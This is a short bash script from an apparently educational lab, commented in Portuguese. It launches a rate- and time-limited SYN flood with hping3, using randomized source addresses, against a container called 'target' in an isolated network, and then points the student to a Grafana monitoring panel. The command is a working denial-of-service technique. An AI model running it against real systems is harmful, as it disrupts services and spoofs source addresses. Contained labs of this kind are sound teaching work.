#!/bin/bash
# Lab didático de SYN flood — rede isolada (sem rota para a internet).
# Alvo fixo em "target" (hostname do container alvo no compose). Taxa e
# duração limitadas de propósito para não travar a máquina do aluno.
#
# Uso: attack-syn.sh [duracao_segundos] [pacotes_por_segundo]

DURATION="${1:-30}"
RATE="${2:-200}"

echo "[attack-syn] alvo=target duracao=${DURATION}s taxa=${RATE}pps"
echo "[attack-syn] Ctrl+C a qualquer momento interrompe."

# -S: flag SYN | -p 80: porta do alvo | --rand-source: varia o IP de origem
# (dentro da rede interna do compose, para simular múltiplos "clientes")
# --faster ~ RATE pps aproximado, controlado por --interval
timeout "${DURATION}" hping3 -S -p 80 --rand-source \
  -i "u$((1000000 / RATE))" \
  target

echo "[attack-syn] fim. Olhe o painel 'SYN_RECV / conexões' no Grafana."
